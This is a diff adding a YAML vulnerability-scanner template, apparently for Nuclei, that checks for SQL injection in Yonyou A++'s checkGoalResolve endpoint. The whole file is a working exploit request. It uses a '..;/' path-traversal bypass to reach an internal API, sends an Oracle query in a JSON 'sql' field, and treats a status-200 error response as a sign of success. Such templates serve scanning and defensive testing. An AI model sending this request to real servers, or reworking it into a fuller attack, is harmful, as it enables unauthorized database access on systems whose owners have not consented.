@@ -1,0 +1,26 @@
+id: yonyou-app-checkgoalresolve-sqli
+
+info:
+  name: 用友A++ checkGoalResolve SQL注入
+  author: SleepingBag945
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /pub/fe/config/..;/..;/..;/pd/api/performance/checkGoalResolve HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Content-Type: application/json
+
+        {"params": {"a": "11"}, "sql": "SYS_CONTEXT('USERENV', 'CURRENT_SCHEMA') FROM DUAL;"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,'配置错误')
